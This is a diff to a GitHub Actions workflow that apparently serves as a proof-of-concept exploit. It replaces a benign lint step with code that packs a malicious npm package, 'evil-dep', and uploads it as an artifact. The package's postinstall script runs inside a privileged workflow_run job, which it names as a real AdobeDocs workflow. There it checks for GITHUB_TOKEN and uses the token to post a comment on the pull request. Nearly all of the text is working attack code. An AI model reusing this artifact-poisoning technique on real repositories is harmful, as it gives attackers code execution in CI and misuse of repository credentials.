@@ -5,15 +5,51 @@ jobs:
   validate:
     runs-on: ubuntu-latest
     steps:
-      - name: Lint report
+      - name: Build attacker-controlled linter-report artifact
         run: |
-          echo "benign lint report" > linter-report.txt
+          set -euo pipefail
+          mkdir -p pkg
+          cat > pkg/package.json <<'JSON'
+          {"name":"evil-dep","version":"1.0.0","scripts":{"postinstall":"node post.js"}}
+          JSON
+          cat > pkg/post.js <<'JS'
+          const fs = require('fs');
+          const path = require('path');
+          const root = process.env.INIT_CWD || process.cwd();
+          fs.writeFileSync('/tmp/ADP_ARTIFACT_RCE', 'pwned');
+          try { fs.appendFileSync(path.join(root, 'linter-report.txt'), '\nRCE_PROOF: install script executed; token_present=' + (process.env.GITHUB_TOKEN ? 'yes' : 'no')); } catch (e) {}
+          (async () => {
+            try {
+              const pr = fs.readFileSync(path.join(root, 'pr-number.txt'), 'utf8').trim();
+              const repo = process.env.GITHUB_REPOSITORY;
+              const r = await fetch(`https://api.github.com/repos/${repo}/issues/${pr}/comments`, {
+                method: 'POST',
+                headers: {
+                  'Authorization': `Bearer ${process.env.GITHUB_TOKEN}`,
+                  'Accept': 'application/vnd.github+json',
+                  'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({ body: 'RCE_PROOF: arbitrary code executed by npm install inside the privileged workflow_run job (real AdobeDocs post-lint-comment-v3.yml).' })
+              });
+              console.log('RCE_PROOF_COMMENT_STATUS=' + r.status);
+            } catch (e) { console.log('RCE_PROOF_COMMENT_ERR=' + e.message); }
+          })();
+          JS
+          (cd pkg && npm pack --silent >/dev/null)
+          cp pkg/evil-dep-1.0.0.tgz .
+          cat > package.json <<'JSON'
+          {"name":"linter-consumer","version":"1.0.0","private":true,"dependencies":{"evil-dep":"file:./evil-dep-1.0.0.tgz"}}
+          JSON
+          echo "attacker controlled report" > linter-report.txt
           echo "${{ github.event.pull_request.number }}" > pr-number.txt
+          ls -la
       - name: Upload linter report
         uses: actions/upload-artifact@v4
         with:
           name: linter-report
           path: |
+            package.json
+            evil-dep-1.0.0.tgz
             linter-report.txt
             pr-number.txt
           if-no-files-found: ignore
